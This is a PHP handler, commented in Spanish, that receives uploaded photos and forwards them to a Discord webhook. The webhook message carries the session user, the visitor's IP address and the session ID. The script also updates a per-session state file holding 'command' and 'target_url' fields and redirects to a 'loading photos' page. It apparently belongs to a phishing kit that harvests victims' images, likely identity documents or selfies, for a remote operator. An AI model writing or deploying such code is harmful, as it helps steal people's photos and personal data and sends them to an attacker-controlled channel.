<?php
require 'config.php';

session_start();

// Aumentar límites y tiempo por si acaso
ini_set('memory_limit', '256M');
ini_set('max_execution_time', '60');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = $_SESSION['usuario'] ?? 'Desconocido';
    $sessionId = $_SESSION['custom_sid'] ?? session_id();
    $ip = getUserIP();

    // Boundary único
    $boundary = '----WebKitFormBoundary' . md5(time());
    
    // Mensaje para Discord
    $contentMessage = "**📸 FOTOS RECIBIDAS**\n**Usuario:** `{$usuario}`\n**IP:** `{$ip}`\n**Session ID:** `{$sessionId}`";

    // Construir cuerpo Multipart
    $body = "";

    // 1. Campo 'content'
    $body .= "--{$boundary}\r\n";
    $body .= "Content-Disposition: form-data; name=\"content\"\r\n\r\n";
    $body .= "{$contentMessage}\r\n";

    // 2. Archivos
    $fileIndex = 0;
    foreach ($_FILES as $key => $file) {
        if ($file['error'] === UPLOAD_ERR_OK) {
            $fileName = basename($file['name']);
            // Limpiar nombre de archivo
            $fileName = preg_replace("/[^a-zA-Z0-9._-]/", "_", $fileName);
            
            $fileData = file_get_contents($file['tmp_name']);
            
            $body .= "--{$boundary}\r\n";
            // Discord usa file0, file1, etc.
            $body .= "Content-Disposition: form-data; name=\"file{$fileIndex}\"; filename=\"{$fileName}\"\r\n";
            $body .= "Content-Type: image/jpeg\r\n\r\n";
            $body .= $fileData . "\r\n";
            
            $fileIndex++;
        }
    }

    // Cerrar boundary
    $body .= "--{$boundary}--\r\n";

    // Configurar contexto HTTP
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: multipart/form-data; boundary={$boundary}\r\n" .
                        "Content-Length: " . strlen($body) . "\r\n",
            'content' => $body,
            'ignore_errors' => true // Para leer respuesta de error si la hay
        ]
    ];

    $context = stream_context_create($options);
    
    // Enviar y obtener respuesta
    $response = @file_get_contents(DISCORD_WEBHOOK_URL, false, $context);

    // Debug opcional: ver headers de respuesta
    // $responseHeaders = $http_response_header;

    // Actualizar estado de sesión
    $file = DATA_DIR . "/{$sessionId}.json";
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        $data['status'] = 'photos_uploaded';
        $data['command'] = null;
        $data['target_url'] = null;
        file_put_contents($file, json_encode($data));
    }

    // Redirección
    header("Location: loading_photos.html?sid={$sessionId}");
    exit;

} else {
    header('Location: index.html');
    exit;
}
